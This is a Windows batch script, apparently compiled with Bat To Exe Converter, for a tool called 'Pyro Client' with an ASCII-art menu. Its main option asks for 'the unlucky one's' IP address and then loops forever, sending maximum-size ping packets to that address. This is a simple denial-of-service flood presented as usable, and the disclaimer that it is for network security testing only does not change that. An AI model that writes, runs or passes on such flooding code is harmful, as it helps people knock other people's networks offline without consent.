::[Bat To Exe Converter]
::
::YAwzoRdxOk+EWAjk
::fBw5plQjdCWDJGyX8VAjFDVVWAyDMleeCaIS5Of66/m7snJPccUAcYzU1PqHI+9z
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSDk=
::cBs/ulQjdF+5
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpCI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+JeA==
::cxY6rQJ7JhzQF1fEqQJQ
::ZQ05rAF9IBncCkqN+0xwdVs0
::ZQ05rAF9IAHYFVzEqQJQ
::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
::cRolqwZ3JBvQF1fEqQJQ
::dhA7uBVwLU+EWDk=
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATElA==
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::Zh4grVQjdCWDJGyX8VAjFDVVWAyDMleeA6YX/Ofr09qesEJdd+42fYHP5qKLMvMa5Uv3SZQowntmmppCXFUOQiKyfAB0imJLs2qRecKEtm8=
::YB416Ek+ZG8=
::
::
::978f952a14a936cc963da21a135fa983
echo off
chcp 65001
title Pyro Client by Nathan Hobbs (c) 2020
color 05
cls

:START
powershell write-host -fore Yellow -back Red WARNING, THIS IS A BETA BUILD. BE PREPARED FOR ANY GLITCHES THAT MAY OCCUR.
echo By using this program you adbide by the TOS located in "Program Info"
echo ╔════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
echo ║█████████  ██      ██  █████████  █████████        █████████   ██       ██  █████████  ██████████  █████████║
echo ║██▓▓▓▓▓██  ██      ██  ██▓▓▓▓▓██  ██▓▓▓▓▓██        ██▓▓▓▓▓▓▓   ██       ██  ██▓▓▓▓▓▓▓  ██▓▓▓▓▓▓██  ▓▓▓██▓▓▓▓║
echo ║█████████  ██████████  ███████▓▓  ██▒▒▒▒▒██        ██▒▒▒▒▒▒▒   ██       ██  ███████▒▒  ██▒▒▒▒▒▒██  ▒▒▒██▒▒▒▒║
echo ║██▓▓▓▓▓▓▓  ▓▓▓▓▓▓▓▓██  ██▓▓▓▓▓██  ██░░░░░██        ██░░░░░░░   ██       ██  ██▓▓▓▓▓░░  ██░░░░░░██  ░░░██░░░░║
echo ║██▒▒▒▒▒▒▒  ██████████  ██▒▒▒▒▒██  █████████        █████████   ███████  ██  █████████  ██      ██     ██    ║
echo ║▓▓░░░░░░░  ▓▓▓▓▓▓▓▓▓▓  ▓▓░░░░░▓▓  ▓▓▓▓▓▓▓▓▓        ▓▓▓▓▓▓▓▓▓   ▓▓▓▓▓▓▓  ▓▓  ▓▓▓▓▓▓▓▓▓  ▓▓      ▓▓     ▓▓    ║
echo ║▒▒         ▒▒▒▒▒▒▒▒▒▒  ▒▒     ▒▒  ▒▒▒▒▒▒▒▒▒        ▒▒▒▒▒▒▒▒▒   ▒▒▒▒▒▒▒  ▒▒  ▒▒▒▒▒▒▒▒▒  ▒▒      ▒▒     ▒▒    ║
echo ║░░         ░░░░░░░░░░  ░░     ░░  ░░░░░░░░░        ░░░░░░░░░   ░░░░░░░  ░░  ░░░░░░░░░  ░░      ░░     ░░    ║
echo ╚════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
echo.
echo.
echo.

echo                ─┐ 
echo                 │ Start client
echo                ─┴─
echo.
echo                        ───┐
echo                        ┌──┘ Program Info
echo                        └───
echo.
echo                                  ──┐
echo                                  ──┤ Exit client
echo                                  ──┘
echo.
echo.
choice /c 123 /m ""

if ERRORLEVEL 3 goto exit
if ERRORLEVEL 2 goto info
if ERRORLEVEL 1 goto combust

:EXIT

exit

:COMBUST
cls
color 0C
echo               ▓▓▓▓        ████                    
echo               ██▓▓          ██████████            
echo               ████  ▓▓▓▓▓▓  ██▒▒░░▒▒▓▓██          
echo                     ▓▓▓▓▓▓████▓▓░░  ▒▒▓▓██        
echo   ██              ▓▓▓▓▓▓▓▓▓▓▓▓▒▒░░░░▒▒▓▓██        
echo             ▓▓██▓▓▓▓▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒▒▓▓▓▓██        
echo             ████▓▓▓▓▒▒░░░░▒▒░░▒▒▓▓▓▓▓▓██          
echo           ▓▓████▓▓▓▓▓▓░░    ░░▒▒▓▓                
echo           ██████▓▓▓▓▓▓░░    ░░▓▓▓▓▓▓████████     
echo ██      ████    ██▓▓▒▒▒▒░░░░▒▒▒▒▓▓██▓▓▓▓▓▓▓▓██    
echo ██  ▓▓▓▓    ▓▓▓▓██▓▓▓▓▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓▒▒░░▓▓████  
echo   ██▓▓▓▓▓▓██  ████▓▓▓▓▓▓▓▓▒▒▓▓▓▓▓▓▓▓▓▓░░  ▒▒▓▓██  
echo   ▓▓▒▒░░▒▒██  ████▓▓▓▓▓▓▓▓▓▓▓▓▓▓████▓▓▒▒▒▒▒▒▓▓██  
echo ██▓▓░░░░▓▓██  ████▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓██  
echo ██▓▓░░▒▒▓▓██████▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▓▓▓▓▒▒▒▒▓▓▓▓████
echo ██▓▓▒▒▓▓▓▓▒▒▓▓▓▓▓▓▒▒▒▒▒▒▓▓▓▓▒▒▒▒▒▒▒▒▒▒░░░░▒▒▓▓████
echo ██▓▓▓▓▓▓██▓▓▒▒▒▒▒▒░░░░░░▒▒▒▒▒▒░░░░░░░░░░░░░░▒▒████
echo   ██▓▓▓▓▓▓▓▓░░░░░░░░    ░░░░▒▒░░░░░░        ░░▓▓██
echo     ██▓▓▓▓▒▒░░░░          ░░░░░░            ░░▓▓  
echo       ████▒▒░░                                ▒▒  
echo         ██▒▒░░                                ▒▒  
echo         ██▓▓░░                              ░░▒▒  
echo           ▓▓▒▒░░                          ░░▒▒    
echo               ▒▒░░░░                    ░░▒▒      
echo                 ▒▒▒▒░░░░          ░░░░▒▒▒▒        
echo                     ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒            
echo.
echo.
echo Who is the unlucky one? (Enter their IP)
set /p ip=""
goto combustion

:COMBUSTION
ping %ip% -l 65535 -w 1 -n 1  | find "Reply" > nul 
color 04
echo.
echo 65KB of fire sent to %ip%!
echo.
ping %ip% -l 65535 -w 1 -n 1  | find "Reply" > nul 
color 06
echo.
echo 65KB of fire sent to %ip%!
echo.


goto combustion

:INFO

echo.
echo.
echo.
echo Client made by Nathan Hobbs. (c) 2020
echo Do not redistribute.
echo.
echo The creator is not liable for any damage created using this program.
echo This is to be used ONLY for the testing of network security.
echo.
pause
cls
goto start


